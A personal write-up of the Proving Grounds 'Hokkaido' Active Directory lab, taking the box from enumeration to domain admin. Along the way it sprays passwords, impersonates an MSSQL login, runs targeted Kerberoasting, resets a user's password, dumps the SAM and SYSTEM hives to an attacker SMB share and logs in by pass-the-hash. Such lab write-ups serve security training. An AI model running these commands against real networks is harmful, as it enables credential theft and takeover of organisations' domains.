Here's a writeup for hokkaido, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/), notably on the Active Directory section. I take note that the community has rated this Very Hard. On a personal note, at the time of writing this, this is my last Proving Grounds box on either the TJ Null list or the LainKusanagi list, though I may go back and actually do writeups on some of the previous boxes. 

As usual we get started with an nmap scan: `sudo nmap -A -sC -p- -v -T4 192.168.171.21 --open -o nmap.txt`, and there is a lot there:

So there's a lot going on here. We can't get very far with any of the web ports, so I try to check out `enum4linux`, the SMB port, rpcclient, ldapsearch, and I can't find anything interesting. Much like the [**Nagoya**](link) box, the solution actually requires you to perform some brute forcing right off the bat. So that's fun, it would be cooler if I had a little bit more time to do this box. 
`kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.157.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50`

This get us a few hits, but ultimately three usernames once we get rid of capitalization. *Side note: I had to run this same command multiple times to get anything from it, not sure why. It kept messing up my VPN which eventually crashed.*

![Hokkaido1.png](/assets/images/Hokkaido/Hokkaido1.png){: .responsive-image}

We have:
- `info@hokkaido-aerospace.com` 
- `administrator@hokkaido-aerospace.com` 
- `discovery@hokkaido-aerospace.com` 
- `maintenance@hokkaido-aerospace.com` 

We can add these users to a `usernames.txt` and then add them along with a few other quick password guesses to a file called `passwords.txt` and try to brute force with smb using crackmapexec. 

`crackmapexec smb 192.168.157.40  --shares -u usernames.txt -p passwords.txt --continue-on-success`

The only hit we get for this is `info:info`, but that's a start. From there we can try to access some shares as the info user. 

![Hokkaido2.png](/assets/images/Hokkaido/Hokkaido2.png){: .responsive-image}

Looks like we have a few different shares to check through:
- WSUSTemp
	- We can't access this. 
- WsusContent
	- There is a file called `anonymousCheckFile.txt`, but it's empty. 
- UpdateServicesPackages
	- This share is empty.
- SYSVOL
	- There's not much here, but this is a file called `password_reset.txt` in a temp folder. It says: `Initial Password: Start123!`. So that's probably another password we can work with.  
- NETLOGON
	- It looks like the same file is here but nothing else. 
- homes
	- This is interesting. It looks like each user has a directory, but it turns out they are all empty. Still, we probably have a new list of users to work with, and they seem like to already be formatted. 
 
![Hokkaido3.png](/assets/images/Hokkaido/Hokkaido3.png){: .responsive-image}

I run crackmapexec using these usernames and the Start123! password: `rackmapexec smb 192.168.157.40  --shares -u usernames.txt -p password1.txt --continue-on-success`. And we get a hit on `discovery`. So now we have `info:info` and `discovery:Start123!`. 

We can go back through some of the same commands we ran with `info:info`, but we ultimately discover that we can access the mssql instance using `impacket-mssqlclient discovery:'Start123!'@192.168.157.40 -windows-auth`. We find a database called `hrappdb`, but when we try to access it we receive this error:

![Hokkaido4.png](/assets/images/Hokkaido/Hokkaido4.png){: .responsive-image}

Now I didn't know this, but apparently we can impersonate a user on mssql. The commands are as follows: 
- `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
	- We are given the response of `hrappdb-reader` so: 
- `EXECUTE AS LOGIN = 'hrappdb-reader'`
- `USE hrappdb`

Then we can view the table names of the hrappdb database using this command: 
`SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;` which shows us the table of `sysauth`. 

![Hokkaido5.png](/assets/images/Hokkaido/Hokkaido5.png){: .responsive-image}

We can further enumerate by getting everything from that table: `SELECT * FROM sysauth;`, and we get what looks like credentials.

![Hokkaido6.png](/assets/images/Hokkaido/Hokkaido6.png){: .responsive-image}

At this point we can add `hrappdb-service:Untimed$Runny` to our creds.txt file, and use it to enumerate further. We can spend some time doing that, but it can help to run `bloodhound-python` with all of these credential sets and add the zip files to bloodhound. We run this for each of the three users we have creds for, info, discovery, and hrapp-service: `bloodhound-python -u "$user" -p '$pass' -d hokkaido-aerospace.com -c all --zip -ns 192.168.157.40`

After loading the results into bloodhound, we notice a few potentially important things:

![Hokkaido7.png](/assets/images/Hokkaido/Hokkaido7.png){: .responsive-image}

On thing to notice is that `Angela.Davies` is a part of the `Domain Admins` group. By clicking around some more we also notice that the `maintenance` user is a part of the `Backup Operators` group. `Molly.Smith` can RDP into the target. If we check the First Degree Object Control of each of our owned users, we can see that `hrapp-service` has GenericWrite privileges on `Hazel.Green`. 


At this point, [this writeup](https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491) suggested to use a tool called [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) which I was not familiar with. Apparently it is much like `impacket-GetUserSPNs`, though instead of collecting the SPNs, it can actually write them when the user being used has the GenericWrite permissions over that user. This is the command:
`targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.157.40`

And it gives us hashes for `Hazel.Green`, `discovery`(don't need), and `maintenance`. (The same writeup already has one for `maintenance`, but whatever.)

![Hokkaido8.png](/assets/images/Hokkaido/Hokkaido8.png){: .responsive-image}

This eventually cracks using hashcat: `hashcat -m 13100 hazelgreen.hash /usr/share/wordlists/rockyou.txt`, and we have `hazel.green:haze1988` to add to our `creds.txt` file and use. We can also check `hazel.green`'s groups and see that she is a member of the `IT` groups (transitively).

![Hokkaido9.png](/assets/images/Hokkaido/Hokkaido9.png){: .responsive-image}

Apparently this means we can change certain user's passwords, inclduing `molly.smith` who we've already discovered is able to RDP into the machine. As with **Nagoya**, this is done with rpcclient. We log in with `hazel.green`, and run: `setuserinfo2 MOLLY.SMITH 23 'pizzaparty123'` to change her password. 

At that point, we can rdp in with: `xfreerdp /u:molly.smith /p:pizzaparty123 /v:192.168.157.40 /drive:/home/pop/Desktop/server,kali`. Crucially, when we log in using the GUI, we can run either powershell or cmd as an administrator, simply by inputting molly.smith's credentials again. This can help us run more things. That said, we try to download a couple of scripts and Windows Defender immediately removes them, so we might need to get more creative. When we open powershell or the command prompt as administrator, we can run `whoami /priv` and get more privileges than we do if we open without being administrator. 

![Hokkaido10.png](/assets/images/Hokkaido/Hokkaido10.png){: .responsive-image}

A big one here is `SeBackupPrivilege`. We run create a `C:\Temp` directory and run`reg save hklm\sam c:\Temp\sam` and `reg save hklm\system c:\Temp\system` and then copy them back to our own machine. I did this using `impacket-smbserver` like so:
From kali:
- `sudo impacket-smbserver -smb2support share . -username "pop" -password "party1"`
From the target: 
- `net use \\$kaliIP\share /user:pop party1`
- `copy C:\Temp\SAM \\$kaliIP\share`
- `copy C:\Temp\System \\$kaliIP\share`

After that, we can run secretsdump to grab the hash of the administrator user. The full command is:`impacket-secretsdump -system System -sam SAM local`
![Hokkaido11.png](/assets/images/Hokkaido/Hokkaido11.png){: .responsive-image}

We then can use this hash to connect to the target as Administrator using any number of tools. With impacket-smbexec, the command is: `impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4 Administrator@192.168.157.40`

![Hokkaido12.png](/assets/images/Hokkaido/Hokkaido12.png){: .responsive-image}

The command is `evil-winrm -i 192.168.157.40 -u Administrator -H d752482897d54e239376fddb2a2109e4`, with the hash the second part of the hash given in the screenshot above. 

![Hokkaido13.png](/assets/images/Hokkaido/Hokkaido13.png){: .responsive-image}

And so on. Either way, this lab has crashed many times, and I'm done with it at this point.
